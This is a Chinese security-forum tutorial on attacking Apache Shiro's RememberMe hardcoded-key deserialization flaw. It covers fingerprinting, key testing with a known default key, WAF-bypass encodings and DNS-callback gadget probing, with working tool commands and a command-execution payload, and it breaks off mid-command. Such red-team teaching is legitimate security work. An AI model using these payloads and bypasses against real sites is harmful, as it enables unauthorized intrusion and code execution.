---
title: 一文搞懂Shiro站点打法全思路
url: https://forum.butian.net/share/4750
source: 奇安信攻防社区
date: 2026-01-29
fetch_date: 2026-01-30T04:02:15.993829
---

# 一文搞懂Shiro站点打法全思路

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 一文搞懂Shiro站点打法全思路

* [漏洞分析](https://forum.butian.net/topic/48)

作为以Java反序列化为载体的经典老洞Shiro的RememberMe硬编码反序列化攻击，它在攻防演练中屡见不鲜，帮助攻防人员拿下一个又一个点。今天作为安服仔的笔者介绍Shiro硬编码Key反序列化的经典打法。笔者几次护网中都遇到几次Shiro，也总结了一点许经验，在这里与各位师傅们分享。

一文搞懂Shiro站点打法全思路
================
前言：
===
作为以Java反序列化为载体的经典老洞Shiro的RememberMe硬编码反序列化攻击，它在攻防演练中屡见不鲜，帮助攻防人员拿下一个又一个点。今天作为安服仔的笔者介绍Shiro硬编码Key反序列化的经典打法。笔者几次护网中都遇到几次Shiro，也总结了一点许经验，在这里与各位师傅们分享。同时作为安服仔我也造轮子搞了款自用的Java漏洞利用工具，本文章也会介绍自用的工具如何在Shiro中进行漏洞利用的。其实换成其他工具也是一样的道理，重要的是思路。
本文不仅仅限于Shiro，很多情况下Java反序列化黑盒测试也是差不多如此的思路。
思路：
===
思路章节介绍从网站Shiro的识别到内存马打入的完整思路：
1. 目标网站是否使用Shiro：请求包发送Cookie: rememberMe\\=1，返回包中出现deleteMe=1则为Shiro
2. 加密方式和密钥Key识别：PrincipalCollectionShiroKeyTest
3. 利用链/中间件环境/JDK版本确认：FindClassByDNS/FindGadgetByDNS/FindClassByBomb
4. 利用链漏洞利用：直接攻击/字节码分离加载/JRMP反连/ShiroChunkPayload分块传输
5. Shiro对抗WAF：HTTP请求包变形/Shiro-Base64混淆
1. 判断网站是否使用Shiro
================
第一步：互联网中任何登录框都可能是Shiro，那么该如何判断是否为Shiro呢？
答案很简单直接在Cookie后面加rememberMe，响应中出现Set-Cookie: rememberMe即为Shiro。像ShiroAttack2和BurpShiroPassiveScan这类工具也是这样判断的
![image-20241214223341-gr8hjcz.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-80a736d1094fe80bf1e6bae6964d8fb9bf8e263b.png)
2. 加密方式和密钥Key识别
===============
确定站点为Shiro后，如何测试出它的加密方式和密钥key呢？通过研究发现当Shiro在处理RememberMe时候，如果密钥正确并且反序列化成功返回的是对象是PrincipalCollection，不会触发异常，响应包则不会带上deleteMe的头，所以可以序列化SimplePrincipalCollection对象来测试Shiro的加密方式和key是否正确。学习自：[基于SimplePrincipalCollection检测key是否正确](https://www.cnblogs.com/zpchcbd/p/15092263.html)
工具YsoSimple：使用PrincipalCollectionShiroKeyTest利用链来检测当前key是否正确
```bash
-m YsoAttack -g PrincipalCollectionShiroKeyTest --shiro-encrypt "AES-CBC" --shiro-key "kPH+bIxk5D2deZiIxcaaaA=="
```
最后响应中没有Set-Cookie: rememberMe=deleteMe;即为AES加密模式和密钥Key均正确
![image-20241214223840-dgvuma8.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-df8fab0a8665a26e78b3a8ccc9f6b3afe97bc427.png)
而在实战中通常我们使用ShiroAttack2或者来BurpShiroPassiveScan来批量爆破Shiro的key和加密方式。
3. Shiro对抗WAF
=============
通常情况下遇到以下三种情况可判断为攻击被WAF拦截：
- HTTP请求发出后连接立马被断开
- HTTP响应码为403
- HTTP响应中出现WAF的拦截防护页面
关于Shiro的反序列化绕WAF其实有很多种方式，归类下可以大致分为俩种：
1. HTTP请求包变形
2. Shiro-Base64编码混淆
3.1 HTTP请求包变形
-------------
Shiro的HTTP请求包变形过WAF：
- HTTP请求方式变形
- rememberMe前后加内容
### 3.1.1 HTTP请求方式变形
将HTTP请求改为PUT，DELETE，OPTIONS，TRACE，XXXX，或者不加都可以正常触发漏洞，这部分原理可以学习c0ny1师傅的[shiro反序列化绕WAF之未知HTTP请求方法](https://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/)文章。
![image-20241214222549-5ivaj3j.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-fd6fdbcf54520cdb3e1a66651d03ab50c7c929df.png)
![image-20241214222602-r4r6eh2.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-c50746fd53f233e1c631caf9aab6ae2f14ef2417.png)
### 3.1.2 rememberMe前后加内容
在rememberMe前后都可添加若干个空格或者Tab来触发漏洞
![image-20241214223023-zqs7clw.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-96821b425a4f84dbc9d78242eee2b02a46e756d2.png)
3.2 Shiro-Base64混淆
------------------
Shiro的Base64混淆过WAF：
- Base64内容中混淆脏数据
- Base64后加脏数据
### 3.2.1 Base64内容中混淆脏数据
Shiro时自己实现的Base64的编码和解码：[org.apache.shiro.codec.Base64](https://shiro.apache.org/static/1.12.0/apidocs/org/apache/shiro/codec/Base64.html)，它的Base64库对数据进行解密时会先剔除些不合法的特殊字符，简单分析下：
首先发送这样的payload，在Base64编码的字符前面加了俩个$$符，并且注意到在payload最后还有一个"="(这个后面会用到)
![image-20231011005827-nxmpb4x.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-016a01feddfae4e1e0f87f7933c5955111b39f96.png)
调试然后在CookieRememberMeManager这里会先获取rememberMe的字段内容，它会先剔除最后一个`=`等号之后的内容(所以我们也可以在`=`后面加脏字符来绕waf)，然后再base64解码
![image-20231011010534-yb3978b.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-bed5d69f09a063f9053f1cf402b000e844d7a481.png)
进入ensurePadding方法然后再进入`Base64#decode`的逻辑，关键点就在`discardNonBase64`方法中
![image-20231011011400-6o83plo.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-3c209c8e71be5235edb6fa4425d9c3c0a245a371.png)
如果对某个字节的`isBase64`判断结果为false，则不会将其添加到加密的数组`groomeData`中。
![image-20231011011614-dcm7o7g.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-573d5474a6b0e8dda145a53ecddda5106b95820b.png)
isBase64方法的内容如下：所以只要让`base64Alphabet[octect]==-1`则可以不进入加密数组中，`octect`是ascii码值
![image-20231011011822-r9t35z7.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-27bd0c80bd853e50bc2198b8ba50e1a1091b2655.png)
查了下ascii码表然后再对照`base64Alphabet`，或许可以填充以下字符来做为脏字符。
![image-20231011012209-ti0r9am.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-c0b2a18226bd253700944c45d49ea35ede9cab67.png)
最后经过测试Shiro Base64解密会对这些字符进行剔除`{'$','#','&','!','%','\*','-','.'}`​
在YsoSimple工具中添加-shiro-base64WafBypas参数并指定垃圾字符的数量来对Base64数据进行混淆，使用如下：
```bash
-m YsoAttack -g CommonsBeanutils2 -a "Templateslmpl:auto\_cmd:calc" -shiro-base64WafBypass 150 --shiro-encrypt "AES-CBC" --shiro-key "kPH+bIxk5D2deZiIxcaaaA=="
```
测试效果：
![image-20241214215703-fo4spu7.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-a3793b31b654bcf3a1026644fd1a40ad86b17b3a.png)
### 3.2.2 Base64后加脏数据
通过测试发现在Shiro加密的Base64数据后加一个"="等号然后接各种各样的脏数据都能触发漏洞利用：
![image-20241214214703-hr02fsu.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-715a1823d526b063df48c8ca7364128cdb5088c8.png)
这个技巧在leveryd师傅的[你的扫描器可以绕过防火墙么？(一)](https://mp.weixin.qq.com/s/P5h9\_K4YcvsrU4tsdHsJdQ)文章中有提及到，php、python、openresty都会不同程度地受Base64变形Payload影响。
3.3 WAF影响的情况
------------
实战中遇到过俩次对PrincipalCollectionShiroKeyTest探测AES密钥和加密方式的Payload拦截的情况，通常我们爆破密钥使用ShiroAttack2或者BurpShiroPassiveScan插件，此类工具没有实现Shiro绕WAF的方式。当实战中PrincipalCollectionShiroKeyTest撞到WAF时，可以把绕WAF的方式补充到工具中然后再去爆破。
4. 利用链/中间件环境/JDK版本确认
====================
第三步：当我们已经确定Shiro的加密方式和Key，这个点没有理由打不下来。这个时候初级安服可能想着工具一键化利用，但是很多工具不能说是完美打点漏洞利用，因为实战中目标环境也许不出网，没有常见利用链，中间件不是常见中间件，JDK也许高版本，Shiro自身Buggy的ClassLoader的坑。当我们用工具稀里糊涂的操作了半天发现内存马没有打进去，这里面出问题的情况可能很多，到时候肯定一头雾水，所以不如在漏洞利用之前我们就把目标站点环境的情况彻底摸清，到时候漏洞利用时就有清晰的思路。
### 4.1 起手式：URLDNS/FindClassByBomb JDK原生利用链初探
URLDNS：使用URLDNS利用链攻击，当DNS服务器收到请求后证明Shiro反序列化漏洞确系存在并且DNS出网，后续我们使用(FindClassByDNS/FindGadgetByDNS利用链)借助DNS探测目标系统存在的依赖，中间件环境，JDK版本。
URLDNS：以DNS的方式来探测目标是否dns出网，为后续FindGadgetByDNS探测环境做准备。
```bash
-m YsoAttack -g URLDNS -a "http://tonjwpkypp.dnsns.cn" --shiro-encrypt "AES-CBC" --shiro-key "kPH+bIxk5D2deZiIxcaaaA=="
```
FindClassByBomb：使用FindClassByBomb利用链攻击，当利用链发出后本次响应后有明显的延迟则证明Shiro反序列化漏洞确系存在，如果上述URLDNS测试完后发现DNS不出网，后续我们可以继续使用FindClassByBomb探测目标系统存在的依赖，中间件环境，JDK版本。关于FindClassByBomb利用链的原理可以学习c0ny1大师的文章：[构造java探测class反序列化gadget](https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/)
```bash
-m YsoAttack -g FindClassByBomb -a "java.lang.String|20" --shiro-encrypt "AES-CBC" --shiro-key "kPH+bIxk5D2deZiIxcaaaA=="
```
### 4.2 探测环境：FindClassByDNS/FindGadgetByDNS/FindClassByBomb
FindGadgetByDNS：FindClassByDNS和FindGadgetByDNS很类似的，这里介绍FindGadgetByDNS，它可以通过一次性反序列化同时探测目标环境中是否存在某些类，如果这些类存在就会收到这些类相关的DNS请求。关于FindGadgetByDNS利用链的原理可以学习kezibei大师的项目：[Urldns](https://github.com/kezibei/Urldns)
使用的注意事项：如果WAF有拦截或者中间件限制长度情况下，我们注意不能一次性探测太多因为利用链过长会被拦截
该利用的局限性：需要DNS出网
// 使用all探测 FindGadgetByDNS 能探测的所有内容
```bash
-m YsoAttack -g FindGadgetByDNS -a "string.dnslog.cn:all"
```
// 对指定的内容进行探测，用竖杠分割开来
```bash
-m YsoAttack -g FindGadgetByDNS -a "string.dnslog.cn:CommonsBeanutils2|C3P0|Fastjson|Jackson"
```
FindClassByBomb：当利用链发出后本次响应后有明显的延迟则证明探测的类确系存在。如果目标环境DNS不出网，我们可以使用FindClassByBomb探测目标系统存在的依赖，中间件环境，JDK版本。
```bash
-m YsoAttack -g FindClassByBomb -a "org.apac...